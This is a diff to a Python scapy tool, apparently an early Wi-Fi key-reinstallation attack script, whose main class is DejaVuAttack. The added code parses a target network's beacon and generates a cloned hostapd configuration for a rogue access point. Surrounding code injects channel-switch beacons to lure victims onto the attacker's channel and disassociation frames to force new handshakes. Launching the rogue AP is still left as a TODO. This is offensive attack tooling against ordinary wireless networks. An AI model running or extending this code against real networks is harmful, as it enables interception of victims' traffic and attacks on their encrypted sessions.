@@ -115,7 +115,6 @@ def construct_csa():
 	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
 	return struct.pack("<BB", IEEE_TLV_TYPE_CSA, len(payload)) + payload
 
-
 def append_csa(p):
 	el = p[Dot11Elt]
 	prevel = None
@@ -127,7 +126,6 @@ def append_csa(p):
 
 	return p
 
-
 def get_tlv_value(p, type):
 	if not Dot11Elt in p: return None
 	el = p[Dot11Elt]
@@ -135,6 +133,75 @@ def get_tlv_value(p, type):
 		if el.ID == IEEE_TLV_TYPE_SSID:
 			return el.info
 	return None
+
+
+class NetworkConfig():
+	def __init__(self):
+		self.ssid = None
+		self.channel = 0
+		self.group_cipher = None
+		self.wpavers = 0
+		self.pairwise_ciphers = set()
+		self.akms = set()
+
+	def is_wparsn(self):
+		return not self.group_cipher is None and self.wpavers > 0 and \
+			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0
+
+	def parse_wparsn(self, wparsn):
+		self.group_cipher = ord(wparsn[5])
+
+		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
+		pos = wparsn[8:]
+		for i in range(num_pairwise):
+			self.pairwise_ciphers.add(ord(pos[3]))
+			pos = pos[4:]
+
+		num_akm = struct.unpack("<H", pos[:2])[0]
+		pos = pos[2:]
+		for i in range(num_akm):
+			self.akms.add(ord(pos[3]))
+			pos = pos[4:]
+
+	def from_beacon(self, p):
+		el = p[Dot11Elt]
+		while isinstance(el, Dot11Elt):
+			if el.ID == 0:
+				self.ssid = el.info
+			elif el.ID == 3:
+				self.channel = ord(el.info[0])
+			elif el.ID == 48:
+				self.parse_wparsn(el.info)
+				self.wpavers |= 2
+			elif el.ID == 221 and el.info[:4] == "\x00\x50\xf2\x01":
+				self.parse_wparsn(el.info[4:])
+				self.wpavers |= 1
+
+			el = el.payload
+
+	def write_config(self, iface):
+		TEMPLATE = """
+interface={iface}
+ssid={ssid}
+channel={channel}
+
+wpa={wpaver}
+wpa_key_mgmt={akms}
+wpa_pairwise={pairwise}
+rsn_pairwise={pairwise}
+
+hw_mode=g
+auth_algs=3
+wpa_passphrase=XXXXXXXX"""
+		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
+		ciphers2str = {2: "TKIP", 4: "CCMP"}
+		return TEMPLATE.format(
+			iface = iface,
+			ssid = self.ssid,
+			channel = self.channel,
+			wpaver = self.wpavers,
+			akms = " ".join([akm2str[idx] for idx in self.akms]),
+			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]))
 
 
 class ClientState():
@@ -168,8 +235,7 @@ class DejaVuAttack():
 
 	def find_beacon(self, ssid):
 		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
-		if p is None or len(p) < 1:
-			raise Exception("No beacon received of network <%s>. Is monitor mode working, and are you on the AP's channel?" % ssid)
+		if p is None or len(p) < 1: return
 		self.beacon = p[0][Dot11]
 		self.apmac = self.beacon.addr2
 
@@ -309,13 +375,29 @@ class DejaVuAttack():
 
 		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
 		self.find_beacon(self.ssid)
+		if self.beacon is None:
+			log(ERROR, "No beacon received of network <%s>. Is monitor mode working, and are you on the correct channel?" % self.ssid)
+			return
 		log(STATUS, "Target network detected: " + self.apmac, color="green")
+
+		# Parse beacon and used this to generate a cloned hostapd.conf
+		netconfig = NetworkConfig()
+		netconfig.from_beacon(self.beacon)
+		if not netconfig.is_wparsn():
+			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
+			print netconfig.write_config(self.nic_rogue)
+			return
+
+		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
+		log(ERROR, "TODO: Once modified hostapd is working properly, automatically start it")
+		#with open("hostapd_rogue.conf", "w") as fp:
+		#	fp.write(netconfig.write_config(self.nic_rogue))
 
 		# Inject a CSA beacon to push victims to our channel -- FIXME: dynamic channel
 		self.send_csa_beacon()
 
 		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
-		if self.clientmac is None: log(STATUS, "No target client given: cannot inject Disassociation to force new handshake")
+		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
 		else:                      self.queue_disas(self.clientmac)
 
 		# Continue attack by monitoring both channels and performing needed actions
